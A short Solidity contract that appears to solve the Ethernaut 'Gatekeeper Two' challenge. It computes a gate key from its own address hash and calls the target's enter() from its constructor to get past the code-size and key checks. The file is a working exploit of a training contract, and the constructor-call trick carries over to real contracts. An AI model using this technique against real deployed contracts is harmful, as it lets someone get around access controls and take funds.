// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperTwo.sol";
// import "hardhat/console.sol";

contract GK2Break {
    address payable gk2;

    constructor(address payable _gk2) public payable {
        gk2 = _gk2;

        // console.log("tx.origin", tx.origin);
        bytes8 _gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                (uint64(0) - 1)
        );
        GatekeeperTwo(gk2).enter(_gateKey);
    }

    // receive() external payable {
    //     require(msg.sender == 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
    // }
}
